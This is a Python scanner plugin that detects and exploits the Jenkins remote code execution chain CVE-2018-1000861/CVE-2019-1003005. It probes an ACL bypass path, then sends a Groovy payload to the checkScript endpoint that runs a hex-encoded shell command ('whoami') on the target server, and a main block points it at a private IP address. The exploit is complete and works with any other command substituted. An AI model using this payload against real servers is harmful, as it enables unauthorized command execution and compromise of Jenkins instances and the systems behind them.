#!/usr/bin/env python3

import binascii
from app.lib.common import get_useragent
from app.lib.request import request

class CVE_2018_1000861_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'CVE-2018-1000861漏洞',
            'description': 'CVE-2018-1000861漏洞可执行任意命令,影响范围为: Jenkins < 2.153, < LTS 2.138.3',
            'date': '2018-12-10',
            'exptype': 'check',
            'type': 'RCE'
        }
        self.url = url
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        self.ACL_PATCHED = 0
        self.NOT_JENKINS = 1
        self.READ_ENABLE = 2
        self.READ_BYPASS = 3
        self.ENTRY_NOTFOUND = 999
        self.headers = {
            "User-Agent": get_useragent()
        }

    async def check_1(self):
    
        """
        第一种方式检测是否存在漏洞

        :param:

        :return: 
        """
        
        flag, accessible = self.ACL_PATCHED, False
        try:
            # check ANONYMOUS_READ
            anonymous_read_req = await request.get(self.url, headers = self.headers)
            if anonymous_read_req.status == 200 and 'adjuncts' in await anonymous_read_req.text():
                flag, accessible = self.READ_ENABLE, True
                print('ANONYMOUS_READ enable!')
            elif anonymous_read_req.status == 403:
                print('ANONYMOUS_READ disable!')
                # check ACL bypass, CVE-2018-1000861
                check_acl_bypass_req = await request.get(self.url + '/securityRealm/user/admin', headers = self.headers)
                if check_acl_bypass_req.status == 200 and 'adjuncts' in await check_acl_bypass_req.text():
                    flag, accessible = self.READ_BYPASS, True
            else:
                flag = self.NOT_JENKINS

            # check entry point, CVE-2019-1003005
            if accessible:
                if flag is self.READ_BYPASS:
                    url = self.url + '/securityRealm/user/admin'
                else:
                    url = self.url
                check_entry_req = await request.get(self.url + '/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript', headers = self.headers)
                if check_entry_req.status == 404:
                    flag = self.ENTRY_NOTFOUND

        except Exception as e:
            # print(e)
            pass
        finally:
            pass
        return flag

    async def check_2(self):
        
        """
        第二种方式检测是否存在漏洞

        :param:

        :return: 
        """
        
        payload = 'public class x{public x(){new String("%s".decodeHex()).execute()}}' % binascii.hexlify('whoami'.encode('utf-8')).decode(encoding='utf-8')
        params = {
            'sandbox': True,
            'value': payload
        }
        try:
            cmd_req = await request.get(self.url + '/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript', params = params, headers = self.headers)
            if cmd_req.status == 200:
                return True
        except Exception as e:
            # print(e)
            pass

    async def check(self):
    
        """
        检测是否存在漏洞

        :param:

        :return bool True or False: 是否存在漏洞
        """
        
        flag = await self.check_1()
        if flag is self.ACL_PATCHED:
            # print('不存在CVE-2018-1000861漏洞')
            return False
        elif flag is self.NOT_JENKINS:
            # print('不存在CVE-2018-1000861漏洞')
            return False
        elif flag is self.READ_ENABLE:
            if await self.check_2():
                # print('存在CVE-2018-1000861漏洞')
                return True
        elif flag is self.READ_BYPASS:
            print('Bypass with CVE-2018-1000861!')
            self.url = self.url + '/securityRealm/user/admin'
            if await self.check_2():
                # print('存在CVE-2018-1000861漏洞')
                return True

if __name__ == '__main__':
    CVE_2018_1000861 = CVE_2018_1000861_BaseVerify('http://10.4.69.55:8789')
    CVE_2018_1000861.check()